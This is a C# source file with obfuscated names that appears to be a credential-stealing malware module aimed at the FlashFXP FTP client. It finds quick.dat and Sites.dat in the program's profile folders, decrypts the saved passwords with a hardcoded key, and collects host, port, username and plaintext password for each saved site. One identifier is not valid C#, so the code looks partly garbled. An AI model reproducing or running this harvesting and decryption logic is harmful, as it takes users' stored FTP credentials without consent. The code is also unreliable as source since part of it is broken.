using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using C6Zy;
using JSW1fecBOy;
using rCOGWW;

namespace rk937aHHc
{
	public class Flash_FXP : EtbH
	{
		public Flash_FXP()
		{
			this.w6YfV = "Flash FXP";
		}

		public string w6YfV { get; set; }

		public List<WTitxI2m> Grab()
		{
			List<WTitxI2m> list = new List<WTitxI2m>();
			List<string> filePaths = Flash_FXP.IpSzrPOtqj();

			if (filePaths.Count == 0)
				return list;

			foreach (string path in filePaths)
			{
				try
				{
					string[] lines = File.ReadAllLines(path);
					if (lines == null || lines.Length <= 1)
						continue;

					string[] dataLines = lines.Skip(1).ToArray();

					w3uoxlrf parsedData = new w3uoxlrf();
					parsedData.sVSM2(dataLines);

					foreach (string key in parsedData.Keys)
					{
						string ip = parsedData[key]["IP"];
						string port = parsedData[key]["port"];
						string user = parsedData[key]["user"];
						string passEncrypted = parsedData[key]["pass"];
						string pass = Flash_FXP.Tk9h(g3Vt7T2gk5.83xr(passEncrypted), key);

						list.Add(new WTitxI2m
						{
							data1 = ip + ":" + port,
							data2 = user,
							data3 = pass,
							data4 = this.w6YfV
						});
					}
				}
				catch
				{
				}
			}

			return list;
		}

		public static List<string> IpSzrPOtqj()
		{
			List<string> list = new List<string>();

			string[] baseDirs = new string[]
			{
		Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "FlashFXP"),
		Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "FlashFXP")
			};

			string[] filesToCheck = new string[] { "quick.dat", "Sites.dat" };

			foreach (string baseDir in baseDirs)
			{
				if (!Directory.Exists(baseDir))
					continue;

				for (int profileIndex = 0; profileIndex <= 5; profileIndex++)
				{
					string profileDir = Path.Combine(baseDir, profileIndex.ToString());
					if (!Directory.Exists(profileDir))
						continue;

					foreach (string fileName in filesToCheck)
					{
						string fullPath = Path.Combine(profileDir, fileName);
						if (File.Exists(fullPath))
						{
							list.Add(fullPath);
						}
					}
				}
			}

			return list;
		}

		public static string Tk9h(byte[] encryptedBytes, string key)
		{
			key = "yA36zA48dEhfrvghGRg57h5UlDv3"; 
			int length = key.Length;
			char[] decryptedChars = new char[encryptedBytes.Length];

			for (int i = 0; i < encryptedBytes.Length; i++)
			{
				int keyChar = key[i % length];
				int nextByte = i + 1 < encryptedBytes.Length ? encryptedBytes[i + 1] ^ keyChar : 0;
				int diff = nextByte - encryptedBytes[i];

				if (diff < 0)
				{
					decryptedChars[i] = (char)(256 + diff);
				}
				else
				{
					decryptedChars[i] = (char)diff;
				}
			}

			return new string(decryptedChars);
		}
	}
}
